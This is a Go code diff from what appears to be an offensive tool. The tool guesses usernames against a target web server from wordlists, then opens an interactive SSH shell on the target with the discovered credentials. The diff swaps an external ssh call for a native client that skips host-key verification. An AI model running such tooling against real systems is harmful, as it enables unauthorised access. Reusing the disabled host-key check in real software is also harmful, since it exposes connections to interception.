@@ -12,10 +12,11 @@ import (
 	"net/http/cookiejar"
 	"net/url"
 	"os"
-	"os/exec"
 	"strings"
 	"sync"
 	"time"
+
+	"golang.org/x/crypto/ssh"
 )
 
 var ANSI_CLRLN string = "\r\x1b[2K\r"
@@ -392,46 +393,83 @@ func FindUsername(baseURL string, wordlist string, threadcount int) (success boo
 //	message - string. status message.
 //
 // ============================================================
-func SSHConnection(targetIP string) (success bool, message string) {
+func SSHConnection(targetIP string, sshpassword string) (success bool, message string) {
 	success = true
 	message = "SSH connection successful"
 
-	for i := 0; i < 60; i++ {
-		fmt.Printf("=")
-	}
+	PrintChar('=', 60)
+	InfMsgNB("Initializing SSH Connection")
+	PrintChar('=', 60)
 	fmt.Printf("\n")
-	InfMsg("Initializing SSH Connection")
-	for i := 0; i < 60; i++ {
-		fmt.Printf("=")
+
+	sshconfig := &ssh.ClientConfig{
+		User:            CREDENTIALS_DISCOVERED[0].Username,
+		Auth:            []ssh.AuthMethod{ssh.Password(sshpassword)},
+		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+		Timeout:         time.Minute,
 	}
-	fmt.Printf("\n\n")
 
-	cmd := exec.Command("ssh", fmt.Sprintf("%s@%s", CREDENTIALS_DISCOVERED[0].Username, targetIP))
-	readpipe, writepipe := io.Pipe()
-
-	cmd.Stdout = writepipe
-	cmd.Stdin = os.Stdin
-
-	go io.Copy(os.Stdout, readpipe)
-
-	err := cmd.Run()
+	connection, err := ssh.Dial("tcp", fmt.Sprintf("%s:22", targetIP), sshconfig)
 	if err != nil {
-		success = false
-		message = err.Error()
+		return false, err.Error()
+	}
+	defer connection.Close()
+
+	session, err := connection.NewSession()
+	if err != nil {
+		return false, fmt.Sprintf("Unable to create SSH session: %s", err.Error())
+	}
+	defer session.Close()
+
+	modes := ssh.TerminalModes{
+		ssh.ECHO:          0,
+		ssh.TTY_OP_ISPEED: 14400,
+		ssh.TTY_OP_OSPEED: 14400,
 	}
 
-	fmt.Printf("\n\n")
-	for i := 0; i < 60; i++ {
-		fmt.Printf("=")
+	if err := session.RequestPty("xterm", 80, 40, modes); err != nil {
+		return false, fmt.Sprintf("request for pseudo terminal failed: %s", err.Error())
 	}
+
+	stdin, err := session.StdinPipe()
+	if err != nil {
+		return false, fmt.Sprintf("Unable to setup stdin for session: %s", err.Error())
+	}
+	go io.Copy(stdin, os.Stdin)
+
+	stdout, err := session.StdoutPipe()
+	if err != nil {
+		return false, fmt.Sprintf("Unable to setup stdout for session: %s", err.Error())
+	}
+	go io.Copy(os.Stdout, stdout)
+
+	stderr, err := session.StderrPipe()
+	if err != nil {
+		return false, fmt.Sprintf("Unable to setup stderr for session: %s", err.Error())
+	}
+	go io.Copy(os.Stderr, stderr)
+
+	err = session.Shell()
+	if err != nil {
+		return false, err.Error()
+	}
+	session.Wait()
+
 	fmt.Printf("\n")
-	InfMsg("SSH Connection Closed")
-	for i := 0; i < 60; i++ {
-		fmt.Printf("=")
-	}
-	fmt.Printf("\n\n")
+	PrintChar('=', 60)
+	InfMsgNB("SSH Connection Closed")
+	PrintChar('=', 60)
+	fmt.Printf("\n")
 
 	return success, message
+}
+
+func PrintChar(c byte, n int) {
+	fmt.Printf("\n")
+	for i := 0; i < n; i++ {
+		fmt.Printf(string(c))
+	}
+	fmt.Printf("\n")
 }
 
 func ValidatePort(portno int) (valid bool, message string) {
@@ -518,11 +556,13 @@ func main() {
 		os.Exit(1)
 	}
 
+	PrintChar('=', 60)
 	InfMsg(fmt.Sprintf("Target IP: %s", targetIP))
 	InfMsg(fmt.Sprintf("Target Port: %d", targetPort))
 	InfMsg(fmt.Sprintf("Thread Count: %d", threadCount))
 	InfMsg(fmt.Sprintf("Username Wordlist: %s", wordlistu))
 	InfMsg(fmt.Sprintf("Password Wordlist: %s", wordlistp))
+	PrintChar('=', 60)
 	fmt.Printf("\n")
 
 	baseURL = fmt.Sprintf("http://%s:%d", targetIP, targetPort)
@@ -562,7 +602,7 @@ func main() {
 			os.Exit(1)
 		}
 
-		success, message = SSHConnection(targetIP)
+		success, message = SSHConnection(targetIP, sshpassword)
 		if !success {
 			ErrMsg(message)
 			os.Exit(1)
